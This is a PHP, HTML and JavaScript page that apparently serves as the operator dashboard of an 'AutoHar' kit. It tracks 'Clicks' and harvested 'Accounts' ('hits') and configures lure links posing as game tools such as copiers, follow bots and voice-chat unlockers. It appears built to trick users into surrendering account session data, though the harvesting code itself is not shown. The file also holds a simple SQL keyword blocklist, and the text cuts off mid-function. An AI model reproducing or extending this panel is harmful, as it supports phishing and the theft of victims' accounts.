<?php
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_name('token');
            if (!session_start()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

$__authResolved = ultimaAuthenticatedRegular();
if (!is_array($__authResolved)) {
    http_response_code(401);
    return;
}
$userData = $__authResolved;
$link_id = (int)$userData['link_id'];
$linkId = $link_id;


$ahDomain = $authar[0] ?? '';
$ahPath = $userData['autohar_path'] ?? '';
$ahVideos = json_decode($userData['autohar_videos'] ?? '{}', true) ?: [];
$ahFullUrl = $ahDomain . '/' . $ahPath;

$clickResult = executeSafeQuery("SELECT COUNT(*) as cnt FROM login_clicks WHERE link_id = :link_id AND type = 'AutoHar'", [':link_id' => $userData['link_id']]);
$ahClicks = $clickResult[0]['cnt'] ?? 0;

$accountResult = executeSafeQuery("SELECT COUNT(*) as cnt FROM hits WHERE link_id = :link_id AND type = 'AutoHar'", [':link_id' => $userData['link_id']]);
$ahAccounts = $accountResult[0]['cnt'] ?? 0;

$customTypes = executeSafeQuery("SELECT * FROM autohar_types WHERE link_id = :link_id ORDER BY created_at DESC", [':link_id' => $userData['link_id']]);
?>

<style>
    .ah-wrap{width:100%;max-width:640px;margin:0 auto}
    .ah-stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
    .ah-stat-card{position:relative;background:rgba(11,12,16,0.85);border:1px solid rgba(255,255,255,0.07);border-radius:14px;padding:20px 22px;display:flex;align-items:center;gap:16px;overflow:hidden;transition:border-color 0.3s}
    .ah-stat-card:hover{border-color:rgba(255,255,255,0.12)}
    .ah-stat-icon{width:42px;height:42px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:0.9rem}
    .ah-stat-icon.clicks{background:rgba(255,255,255,0.04);color:rgba(255,255,255,0.35);border:1px solid rgba(255,255,255,0.06)}
    .ah-stat-icon.accounts{background:rgba(255,255,255,0.04);color:rgba(255,255,255,0.35);border:1px solid rgba(255,255,255,0.06)}
    .ah-stat-info{display:flex;flex-direction:column;gap:2px;min-width:0}
    .ah-stat-num{font-size:1.65rem;font-weight:700;color:#fff;line-height:1;font-family:'Rajdhani',sans-serif;letter-spacing:-0.5px}
    .ah-stat-lbl{font-size:0.55rem;text-transform:uppercase;letter-spacing:1.8px;color:rgba(255,255,255,0.22);font-family:'Rajdhani',sans-serif;font-weight:600}
    .ah-stat-card::after{content:'';position:absolute;top:0;right:0;width:80px;height:80px;border-radius:50%;filter:blur(40px);opacity:0.07;pointer-events:none}
    .ah-stat-card:first-child::after{background:#fff}
    .ah-stat-card:last-child::after{background:#fff}
    .ah-card{background:rgba(11,12,16,0.85);border:1px solid rgba(255,255,255,0.07);border-radius:14px;padding:22px;margin-bottom:16px}
    .ah-label{display:block;font-size:0.6rem;color:rgba(255,255,255,0.28);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px;font-weight:600;font-family:'Rajdhani',sans-serif}
    .ah-link-box{display:flex;align-items:center;gap:8px;padding:11px 14px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px;overflow:hidden;flex:1;min-width:0}
    .ah-link-box i{color:rgba(255,255,255,0.7);font-size:0.65rem;flex-shrink:0}
    .ah-link-box span{font-size:0.8rem;color:rgba(255,255,255,0.4);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:'Rajdhani',sans-serif}
    .ah-url-row{display:flex;align-items:stretch}
    .ah-url-row input{flex:1;padding:11px 13px;background:rgba(15,17,25,0.9);border:1px solid rgba(255,255,255,0.08);border-right:none;border-radius:8px 0 0 8px;color:rgba(255,255,255,0.55);font-family:'Rajdhani',sans-serif;font-size:0.85rem;min-width:0;outline:none;transition:border-color 0.3s}
    .ah-url-row input:focus{border-color:rgba(255,255,255,0.18)}
    .ah-copy-btn{display:flex;align-items:center;gap:5px;padding:11px 16px;background:rgba(255,255,255,0.9);border:1px solid rgba(255,255,255,0.15);border-left:none;border-radius:0 8px 8px 0;color:#0a0b0f;font-family:'Rajdhani',sans-serif;font-size:0.8rem;font-weight:700;cursor:pointer;transition:all 0.2s;white-space:nowrap;flex-shrink:0}
    .ah-copy-btn:hover{background:#fff}
    .ah-copy-btn i{font-size:0.7rem}
    .ah-path-wrap{display:flex;align-items:center;background:rgba(15,17,25,0.9);border:1px solid rgba(255,255,255,0.08);border-radius:8px;transition:border-color 0.3s,box-shadow 0.3s;overflow:hidden}
    .ah-path-wrap input{flex:1;padding:11px 13px;background:transparent;border:none;color:#fff;font-family:'Rajdhani',sans-serif;font-size:0.9rem;outline:none;min-width:0}
    .ah-path-wrap textarea{flex:1;padding:11px 13px;background:transparent;border:none;color:#fff;font-family:'Rajdhani',sans-serif;font-size:0.85rem;outline:none;min-width:0;resize:none;min-height:60px}
    .ah-path-save{padding:5px 14px;margin-right:6px;background:transparent;border:1px solid rgba(255,255,255,0.1);border-radius:5px;color:rgba(255,255,255,0.3);font-family:'Rajdhani',sans-serif;font-size:0.6rem;font-weight:600;letter-spacing:0.8px;text-transform:uppercase;cursor:pointer;transition:all 0.3s;white-space:nowrap;opacity:0;pointer-events:none}
    .ah-path-save.visible{opacity:1;pointer-events:auto}
    .ah-path-save:hover{border-color:rgba(255,255,255,0.25);color:rgba(255,255,255,0.55)}
    .ah-path-save.saved{border-color:rgba(255,255,255,0.2);color:rgba(255,255,255,0.5)}
    .ah-path-counter{font-size:0.55rem;color:rgba(255,255,255,0.18);letter-spacing:0.5px;margin-right:8px;white-space:nowrap;flex-shrink:0}
    .ah-path-counter.warn{color:rgba(255,100,100,0.45)}
    .ah-path-error{font-size:0.6rem;color:rgba(255,80,80,0.7);font-family:'Rajdhani',sans-serif;font-weight:600;letter-spacing:0.3px;margin-top:6px;display:none}
    .ah-type-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}
    .ah-type-chip{padding:10px 4px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:rgba(255,255,255,0.3);font-family:'Rajdhani',sans-serif;font-size:0.65rem;font-weight:600;letter-spacing:0.2px;cursor:pointer;transition:all 0.25s;user-select:none;text-align:center;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .ah-type-chip:hover{border-color:rgba(255,255,255,0.12);color:rgba(255,255,255,0.5);background:rgba(255,255,255,0.035)}
    .ah-type-chip.active{background:rgba(255,255,255,0.05);border-color:rgba(255,255,255,0.16);color:#fff}
    .ah-type-chip.custom{border-style:dashed;position:relative}
    .ah-type-chip.custom .edit-type{position:absolute;top:-6px;right:-6px;width:16px;height:16px;background:rgba(255,255,255,0.8);border-radius:50%;display:none;align-items:center;justify-content:center;font-size:8px;color:#0a0b0f;cursor:pointer}
    .ah-type-chip.custom:hover .edit-type{display:flex}
    .ah-create-btn{padding:10px 4px;background:rgba(255,255,255,0.015);border:1px dashed rgba(255,255,255,0.08);border-radius:8px;color:rgba(255,255,255,0.22);font-family:'Rajdhani',sans-serif;font-size:0.65rem;font-weight:600;cursor:pointer;transition:all 0.25s;text-align:center}
    .ah-create-btn:hover{border-color:rgba(255,255,255,0.18);color:rgba(255,255,255,0.4);background:rgba(255,255,255,0.03)}
    .ah-create-btn i{margin-right:4px}
    .ah-video-enter{animation:ahFadeUp 0.3s cubic-bezier(0.16,1,0.3,1) both}
    @keyframes ahFadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
    .ah-help-icon{display:inline-flex;align-items:center;justify-content:center;width:14px;height:14px;color:rgba(255,255,255,0.22);cursor:help;position:relative;font-size:0.65rem}
    .ah-help-icon:hover{color:rgba(255,255,255,0.45)}
    .ah-tooltip-box{position:absolute;top:calc(100% + 8px);left:50%;transform:translateX(-50%);background:rgba(10,11,15,0.98);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:10px 12px;font-size:0.7rem;font-weight:400;color:rgba(255,255,255,0.65);white-space:pre-line;min-width:220px;max-width:280px;text-transform:none;letter-spacing:0;line-height:1.5;opacity:0;visibility:hidden;transition:opacity 0.2s,visibility 0.2s;z-index:100;box-shadow:0 4px 24px rgba(0,0,0,0.5);cursor:text;user-select:text}
    .ah-tooltip-box::before{content:'';position:absolute;top:-8px;left:50%;transform:translateX(-50%);border:6px solid transparent;border-bottom-color:rgba(255,255,255,0.1)}
    .ah-tooltip-box.show{opacity:1;visibility:visible}
    .ah-tooltip-box .copy-tip{position:absolute;bottom:6px;right:8px;font-size:0.55rem;color:rgba(255,255,255,0.2);pointer-events:none}
    .ah-video-icon{display:inline-flex;align-items:center;justify-content:center;width:14px;height:14px;color:rgba(255,255,255,0.22);cursor:pointer;font-size:0.65rem;transition:color 0.2s;position:relative}
    .ah-video-icon:hover{color:rgba(255,255,255,0.45)}
    .ah-tut-hint{position:absolute;bottom:100%;left:50%;transform:translateX(-50%);margin-bottom:2px;font-size:9px;font-weight:400;color:rgba(255,255,255,0.18);white-space:nowrap;pointer-events:none;text-transform:none;letter-spacing:0}
    .ah-video-modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0);z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px;pointer-events:none;opacity:0;visibility:hidden;transition:background 0.3s ease,opacity 0.3s ease,visibility 0.3s ease}
    .ah-video-modal.show{background:rgba(0,0,0,0.9);pointer-events:auto;opacity:1;visibility:visible}
    .ah-video-modal-content{position:relative;width:100%;max-width:800px;transform:scale(0.9);opacity:0;transition:transform 0.3s cubic-bezier(0.34,1.56,0.64,1),opacity 0.3s ease}
    .ah-video-modal.show .ah-video-modal-content{transform:scale(1);opacity:1}
    .ah-video-modal video{width:100%;aspect-ratio:16/9;border:none;border-radius:12px;background:#000}
    .ah-modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px;pointer-events:none;opacity:0;visibility:hidden;transition:background 0.3s ease,opacity 0.3s ease,visibility 0.3s ease}
    .ah-modal-overlay.show{background:rgba(0,0,0,0.8);pointer-events:auto;opacity:1;visibility:visible}
    .ah-modal{background:rgba(15,17,25,0.98);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:26px;width:100%;max-width:420px;max-height:90vh;overflow-y:auto;transform:scale(0.9) translateY(-20px);opacity:0;transition:transform 0.3s cubic-bezier(0.34,1.56,0.64,1),opacity 0.3s ease}
    .ah-modal-overlay.show .ah-modal{transform:scale(1) translateY(0);opacity:1}
    .ah-modal-title{font-size:1.1rem;font-weight:600;color:#fff;margin-bottom:20px;font-family:'Rajdhani',sans-serif}
    .ah-modal-field{margin-bottom:16px}
    .ah-modal-actions{display:flex;gap:10px;margin-top:22px}
    .ah-modal-btn{flex:1;padding:12px;border-radius:8px;font-family:'Rajdhani',sans-serif;font-size:0.85rem;font-weight:600;cursor:pointer;transition:all 0.2s;border:none}
    .ah-modal-btn.cancel{background:rgba(255,255,255,0.04);color:rgba(255,255,255,0.45)}
    .ah-modal-btn.cancel:hover{background:rgba(255,255,255,0.07)}
    .ah-modal-btn.save{background:rgba(255,255,255,0.9);color:#0a0b0f}
    .ah-modal-btn.save:hover{background:#fff}
    .ah-custom-list{margin-top:12px;display:flex;flex-direction:column;gap:8px}
    .ah-custom-item{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px}
    .ah-custom-item-name{font-size:0.8rem;color:rgba(255,255,255,0.6);font-family:'Rajdhani',sans-serif}
    .ah-custom-item-actions{display:flex;gap:8px}
    .ah-custom-item-btn{background:transparent;border:none;color:rgba(255,255,255,0.3);cursor:pointer;font-size:0.75rem;padding:4px 8px;transition:color 0.2s}
    .ah-custom-item-btn:hover{color:rgba(255,255,255,0.6)}
    .ah-custom-item-btn.delete:hover{color:rgba(255,100,100,0.8)}
    @media(max-width:480px){
        .ah-wrap{max-width:100%}
        .ah-card{padding:16px}
        .ah-stats-grid{grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
        .ah-stat-card{padding:16px;gap:12px}
        .ah-stat-icon{width:36px;height:36px;font-size:0.8rem}
        .ah-stat-num{font-size:1.35rem}
        .ah-type-grid{gap:5px}
        .ah-type-chip{padding:9px 3px;font-size:0.6rem}
        .ah-url-row{flex-direction:column}
        .ah-url-row input{border-radius:8px!important;border:1px solid rgba(255,255,255,0.08)!important}
        .ah-url-row .ah-copy-btn{border-radius:8px;border:1px solid rgba(255,255,255,0.12);justify-content:center}
        .ah-modal{padding:20px}
    }
    @media(max-width:360px){
        .ah-stats-grid{gap:6px}
        .ah-stat-card{padding:14px;gap:10px}
        .ah-stat-icon{width:32px;height:32px;font-size:0.75rem}
        .ah-stat-num{font-size:1.2rem}
        .ah-type-grid{gap:4px}
        .ah-type-chip{padding:8px 2px;font-size:0.57rem}
    }
    
    .ah-yt-card{margin-top:12px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:10px;overflow:hidden;display:flex;align-items:center;gap:0;height:80px;transition:border-color 0.3s;cursor:pointer}
    .ah-yt-card:hover{border-color:rgba(255,255,255,0.12)}
    .ah-yt-thumb{position:relative;width:124px;height:80px;flex-shrink:0;background:#0a0b0f;overflow:hidden}
    .ah-yt-thumb img{width:100%;height:100%;object-fit:cover;opacity:0.75;transition:opacity 0.3s}
    .ah-yt-card:hover .ah-yt-thumb img{opacity:0.9}
    .ah-yt-play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:30px;height:30px;background:rgba(255,255,255,0.9);border-radius:50%;display:flex;align-items:center;justify-content:center;transition:transform 0.2s}
    .ah-yt-play i{font-size:0.55rem;color:#0a0b0f;margin-left:2px}
    .ah-yt-card:hover .ah-yt-play{transform:translate(-50%,-50%) scale(1.1)}
    .ah-yt-info{flex:1;min-width:0;padding:12px 16px;display:flex;flex-direction:column;justify-content:center;gap:4px}
    .ah-yt-title{font-family:'Rajdhani',sans-serif;font-size:0.75rem;font-weight:600;color:rgba(255,255,255,0.55);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .ah-yt-sub{font-family:'Rajdhani',sans-serif;font-size:0.6rem;color:rgba(255,255,255,0.2);letter-spacing:0.5px;display:flex;align-items:center;gap:5px}
    .ah-yt-sub i{font-size:0.5rem;color:rgba(255,60,60,0.6)}
    .ah-toast{position:fixed;top:24px;left:50%;transform:translateX(-50%) translateY(-20px);background:rgba(15,17,25,0.97);border:1px solid rgba(255,80,80,0.25);border-radius:10px;padding:12px 20px;display:flex;align-items:center;gap:10px;z-index:99999;opacity:0;visibility:hidden;transition:all 0.35s cubic-bezier(0.16,1,0.3,1);box-shadow:0 8px 32px rgba(0,0,0,0.5);max-width:360px;pointer-events:none}
    .ah-toast.show{opacity:1;visibility:visible;transform:translateX(-50%) translateY(0);pointer-events:auto}
    .ah-toast.success{border-color:rgba(100,255,150,0.2)}
    .ah-toast-icon{width:28px;height:28px;border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:0.7rem}
    .ah-toast-icon.error{background:rgba(255,80,80,0.12);color:rgba(255,100,100,0.8)}
    .ah-toast-icon.success{background:rgba(100,255,150,0.1);color:rgba(100,255,150,0.7)}
    .ah-toast-msg{font-family:'Rajdhani',sans-serif;font-size:0.8rem;font-weight:600;color:rgba(255,255,255,0.7);letter-spacing:0.2px;line-height:1.4}
</style>

<div class="ah-toast" id="ahToast">
    <div class="ah-toast-icon error" id="ahToastIcon"><i class="fas fa-exclamation-triangle" id="ahToastIconI"></i></div>
    <div class="ah-toast-msg" id="ahToastMsg"></div>
</div>

<div class="header" style="margin-bottom:20px;">
    <div style="display:flex;align-items:center;gap:12px;">
        <h1 style="margin:0;display:flex;align-items:center;gap:10px;color:rgba(255,255,255,0.5);text-shadow:none;">
            <i class="fas fa-file-lines" style="font-size:1.2rem;color:rgba(255,255,255,0.5);"></i> AutoHar
        </h1>
    </div>
</div>

<div class="ah-wrap">
    <div class="ah-stats-grid">
        <div class="ah-stat-card">
            <div class="ah-stat-icon clicks">
                <i class="fas fa-arrow-pointer"></i>
            </div>
            <div class="ah-stat-info">
                <div class="ah-stat-num"><?= intval($ahClicks) ?></div>
                <div class="ah-stat-lbl">Clicks</div>
            </div>
        </div>
        <div class="ah-stat-card">
            <div class="ah-stat-icon accounts">
                <svg fill="currentColor" width="18" height="18" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M 16 4 C 9.371094 4 4 9.371094 4 16 C 4 22.628906 9.371094 28 16 28 C 22.628906 28 28 22.628906 28 16 C 28 15.515625 27.964844 15.039063 27.90625 14.566406 C 27.507813 14.839844 27.023438 15 26.5 15 C 25.421875 15 24.511719 14.3125 24.160156 13.359375 C 23.535156 13.757813 22.796875 14 22 14 C 19.789063 14 18 12.210938 18 10 C 18 9.265625 18.210938 8.585938 18.558594 7.992188 C 18.539063 7.996094 18.519531 8 18.5 8 C 17.117188 8 16 6.882813 16 5.5 C 16 4.941406 16.1875 4.433594 16.496094 4.019531 C 16.332031 4.011719 16.167969 4 16 4 Z M 23.5 4 C 22.671875 4 22 4.671875 22 5.5 C 22 6.328125 22.671875 7 23.5 7 C 24.328125 7 25 6.328125 25 5.5 C 25 4.671875 24.328125 4 23.5 4 Z M 14.050781 6.1875 C 14.25 7.476563 15 8.585938 16.046875 9.273438 C 16.015625 9.511719 16 9.757813 16 10 C 16 13.308594 18.691406 16 22 16 C 22.496094 16 22.992188 15.9375 23.46875 15.8125 C 24.152344 16.4375 25.015625 16.851563 25.953125 16.96875 C 25.464844 22.03125 21.1875 26 16 26 C 10.484375 26 6 21.515625 6 16 C 6 11.152344 9.46875 7.097656 14.050781 6.1875 Z M 22 9 C 21.449219 9 21 9.449219 21 10 C 21 10.550781 21.449219 11 22 11 C 22.550781 11 23 10.550781 23 10 C 23 9.449219 22.550781 9 22 9 Z M 14 10 C 13.449219 10 13 10.449219 13 11 C 13 11.550781 13.449219 12 14 12 C 14.550781 12 15 11.550781 15 11 C 15 10.449219 14.550781 10 14 10 Z M 27 10 C 26.449219 10 26 10.449219 26 11 C 26 11.550781 26.449219 12 27 12 C 27.550781 12 28 11.550781 28 11 C 28 10.449219 27.550781 10 27 10 Z M 11 13 C 9.894531 13 9 13.894531 9 15 C 9 16.105469 9.894531 17 11 17 C 12.105469 17 13 16.105469 13 15 C 13 13.894531 12.105469 13 11 13 Z M 16 15 C 15.449219 15 15 15.449219 15 16 C 15 16.550781 15.449219 17 16 17 C 16.550781 17 17 16.550781 17 16 C 17 15.449219 16.550781 15 16 15 Z M 12.5 19 C 11.671875 19 11 19.671875 11 20.5 C 11 21.328125 11.671875 22 12.5 22 C 13.328125 22 14 21.328125 14 20.5 C 14 19.671875 13.328125 19 12.5 19 Z M 19.5 20 C 18.671875 20 18 20.671875 18 21.5 C 18 22.328125 18.671875 23 19.5 23 C 20.328125 23 21 22.328125 21 21.5 C 21 20.671875 20.328125 20 19.5 20 Z"/></svg>
            </div>
            <div class="ah-stat-info">
                <div class="ah-stat-num"><?= intval($ahAccounts) ?></div>
                <div class="ah-stat-lbl">Accounts</div>
            </div>
        </div>
    </div>
    <div class="ah-card">
        <div class="ah-label" style="display:flex;align-items:center;gap:6px;">Your AutoHar Link <span class="ah-help-icon" id="ahHelpIcon"><i class="fas fa-question-circle"></i><div class="ah-tooltip-box" id="ahTooltipBox"><span id="ahTooltipText"></span><span class="copy-tip">Click to copy</span></div></span><span class="ah-video-icon" id="ahVideoIcon" onclick="openTutorialVideo()"><i class="fas fa-play-circle"></i><span class="ah-tut-hint">Tutorial Autohar</span></span></div>
        <div class="ah-link-box">
            <i class="fas fa-link"></i>
            <span id="ahUrlPreview"><?= htmlspecialchars($ahFullUrl) ?></span>
        </div>
    </div>
    <div class="ah-card">
        <div style="margin-bottom:16px;">
            <label class="ah-label">Link</label>
            <div class="ah-url-row">
                <input type="text" id="ahCopyUrl" value="https://<?= htmlspecialchars($ahFullUrl) ?>" readonly>
                <button type="button" class="ah-copy-btn" onclick="copyAutoharUrl()">
                    <i class="fas fa-copy"></i> Copy
                </button>
            </div>
        </div>

        <div style="margin-bottom:16px;">
            <label class="ah-label">Path <span class="ah-path-counter" id="ahPathCounter"><?= strlen($ahPath) ?>/30</span></label>
            <div class="ah-path-wrap">
                <input type="text" id="ahPathInput" value="<?= htmlspecialchars($ahPath) ?>" placeholder="Enter path" maxlength="30" oninput="ahValidatePath(this);updateAutoharPreview();ahShowSave()" onfocus="this.parentElement.style.borderColor='rgba(255,255,255,0.2)';this.parentElement.style.boxShadow='0 0 0 2px rgba(255,255,255,0.04)'" onblur="this.parentElement.style.borderColor='rgba(255,255,255,0.08)';this.parentElement.style.boxShadow='none'">
                <button type="button" id="ahPathSave" class="ah-path-save" onclick="saveAutoharPath()">Save</button>
            </div>
            <div class="ah-path-error" id="ahPathError">Minimum 3 characters required</div>
        </div>

        <div style="margin-bottom:16px;">
            <label class="ah-label">Type</label>
            <div class="ah-type-grid" id="ahTypeGrid">
                <div class="ah-type-chip" data-cat="GameCopier" onclick="selectAhCat(this)">Game Copier</div>
                <div class="ah-type-chip" data-cat="FollowBot" onclick="selectAhCat(this)">Follow Bot</div>
                <div class="ah-type-chip" data-cat="VoiceChatUnlocker" onclick="selectAhCat(this)">Voice Chat</div>
                <div class="ah-type-chip" data-cat="GameVisitsBotter" onclick="selectAhCat(this)">Visits Bot</div>
                <div class="ah-type-chip" data-cat="ShirtCopier" onclick="selectAhCat(this)">Shirt Copier</div>
                <div class="ah-type-chip" data-cat="GameJoiner" onclick="selectAhCat(this)">Game Joiner</div>
                <?php foreach ($customTypes as $ct): ?>
                <div class="ah-type-chip custom" data-cat="custom_<?= htmlspecialchars($ct['type_slug']) ?>" onclick="selectAhCat(this)">
                    <?= htmlspecialchars($ct['title']) ?>
                    <span class="edit-type" onclick="event.stopPropagation();editCustomType('<?= htmlspecialchars($ct['type_slug']) ?>')"><i class="fas fa-pen"></i></span>
                </div>
                <?php endforeach; ?>
                <div class="ah-create-btn" onclick="openCreateModal()"><i class="fas fa-plus"></i> Create</div>
            </div>
        </div>

        <div id="ahVideoWrap" style="margin-bottom:16px;display:none;">
            <label class="ah-label">YouTube Video</label>
            <div class="ah-path-wrap">
                <input type="text" id="ahVideoInput" value="" placeholder="https://www.youtube.com/watch?v=..." oninput="ahShowVideoSave()" onfocus="this.parentElement.style.borderColor='rgba(255,255,255,0.2)';this.parentElement.style.boxShadow='0 0 0 2px rgba(255,255,255,0.04)'" onblur="this.parentElement.style.borderColor='rgba(255,255,255,0.08)';this.parentElement.style.boxShadow='none'">
                <button type="button" id="ahVideoSave" class="ah-path-save" onclick="saveAutoharVideo()">Save</button>
            </div>
            <div id="ahVideoPreview" style="display:none;"></div>
        </div>
    </div>
</div>

<div class="ah-video-modal" id="ahVideoModal" onclick="if(event.target===this)closeTutorialVideo()">
    <div class="ah-video-modal-content">
        <video id="ahTutorialVideo" controls playsinline><source src="/images/video.mp4" type="video/mp4"></video>
    </div>
</div>

<div class="ah-modal-overlay" id="ahCreateModal">
    <div class="ah-modal">
        <div class="ah-modal-title" id="ahModalTitle">Create Custom Type</div>
        <div class="ah-modal-field">
            <label class="ah-label">Slug (URL path)</label>
            <div class="ah-path-wrap">
                <input type="text" id="ctSlug" placeholder="my-custom-type" maxlength="50" oninput="this.value=this.value.toLowerCase().replace(/[^a-z0-9-]/g,'')">
            </div>
        </div>
        <div class="ah-modal-field">
            <label class="ah-label">Title</label>
            <div class="ah-path-wrap">
                <input type="text" id="ctTitle" placeholder="My Custom Tool" maxlength="100">
            </div>
        </div>
        <div class="ah-modal-field">
            <label class="ah-label">Description</label>
            <div class="ah-path-wrap">
                <textarea id="ctDescription" placeholder="Enter description..."></textarea>
            </div>
        </div>
        <div class="ah-modal-field">
            <label class="ah-label">YouTube Video (optional)</label>
            <div class="ah-path-wrap">
                <input type="text" id="ctVideo" placeholder="https://www.youtube.com/watch?v=...">
            </div>
        </div>
        <div class="ah-modal-field">
            <label class="ah-label">Button Text</label>
            <div class="ah-path-wrap">
                <input type="text" id="ctButton" placeholder="Submit" maxlength="50" value="Submit">
            </div>
        </div>
        <div class="ah-modal-actions">
            <button type="button" class="ah-modal-btn save" id="ahModalSave" onclick="saveCustomType()">Create</button>
        </div>
    </div>
</div>

<script>
var ahToastTimer = null;
function showToast(msg, type) {
    var toast = document.getElementById('ahToast');
    var icon = document.getElementById('ahToastIcon');
    var iconI = document.getElementById('ahToastIconI');
    var msgEl = document.getElementById('ahToastMsg');
    clearTimeout(ahToastTimer);
    toast.classList.remove('show','success');
    icon.className = 'ah-toast-icon ' + (type || 'error');
    iconI.className = type === 'success' ? 'fas fa-check' : 'fas fa-exclamation-triangle';
    if (type === 'success') toast.classList.add('success');
    toast.style.borderColor = type === 'success' ? 'rgba(100,255,150,0.2)' : 'rgba(255,80,80,0.25)';
    msgEl.textContent = msg;
    void toast.offsetWidth;
    toast.classList.add('show');
    ahToastTimer = setTimeout(function() { toast.classList.remove('show'); }, 3000);
}

var ahSelectedCat = '';
var ahVideos = <?= json_encode($ahVideos) ?>;
var customTypesData = <?= json_encode($customTypes ?: []) ?>;

function ahValidatePath(input) {
    input.value = input.value.replace(/\s/g, '');
    if (input.value.length > 30) input.value = input.value.substring(0, 30);
    var counter = document.getElementById('ahPathCounter');
    if (counter) {
        counter.textContent = input.value.length + '/30';
        counter.classList.toggle('warn', input.value.length >= 28);
    }
    var err = document.getElementById('ahPathError');
    if (err) {
        if (input.value.length > 0 && input.value.length < 3) {
            err.style.display = 'block';
        } else {
            err.style.display = 'none';
        }
    }
}

function selectAhCat(el) {
    var cat = el.getAttribute('data-cat');
    if (el.classList.contains('active')) {
        el.classList.remove('active');
        ahSelectedCat = '';
        updateAutoharPreview();
        var vw = document.getElementById('ahVideoWrap');
        if (vw) vw.style.display = 'none';
        return;
    }
    document.querySelectorAll('.ah-type-chip').forEach(function(c) { c.classList.remove('active'); });
    el.classList.add('active');
    ahSelectedCat = cat;
    updateAutoharPreview();
    var vw = document.getElementById('ahVideoWrap');
    var vi = document.getElementById('ahVideoInput');
    var vs = document.getElementById('ahVideoSave');
    if (vw) {
        if (ahSelectedCat) {
            vw.style.display = 'block';
            vw.classList.remove('ah-video-enter');
            void vw.offsetWidth;
            vw.classList.add('ah-video-enter');
            if (ahSelectedCat.startsWith('custom_')) {
                var slug = ahSelectedCat.replace('custom_', '');
                var typeData = customTypesData.find(function(t) { return t.type_slug === slug; });
                vi.value = typeData ? (typeData.video_url || '') : '';
            } else {
                vi.value = ahVideos[ahSelectedCat] || '';
            }
            vs.classList.remove('visible', 'saved');
            renderVideoPreview();
        } else {
            vw.style.display = 'none';
        }
    }
}

function updateAutoharPreview() {
    var path = document.getElementById('ahPathInput');
    var preview = document.getElementById('ahUrlPreview');
    var copyInput = document.getElementById('ahCopyUrl');
    if (path && preview && copyInput) {
        var domain = '<?= $authar[0] ?? '' ?>';
        var full = domain + '/' + path.value;
        if (ahSelectedCat) {
            if (ahSelectedCat.startsWith('custom_')) {
                full += '/' + ahSelectedCat.replace('custom_', '');
            } else {
                full += '/' + ahSelectedCat;
            }
        }
        preview.textContent = full;
        copyInput.value = 'https://' + full;
    }
}

function ahShowSave() {
    var btn = document.getElementById('ahPathSave');
    if (btn) { btn.classList.add('visible'); btn.classList.remove('saved'); btn.textContent = 'Save'; }
}

function ahShowVideoSave() {
    var btn = document.getElementById('ahVideoSave');
    if (btn) { btn.classList.add('visible'); btn.classList.remove('saved'); btn.textContent = 'Save'; }
}

function getYoutubeId(url) {
    var m = url.match(/(?:youtu\.be\/|youtube\.com\/(?:watch\?v=|embed\/|shorts\/))([a-zA-Z0-9_-]{11})/);
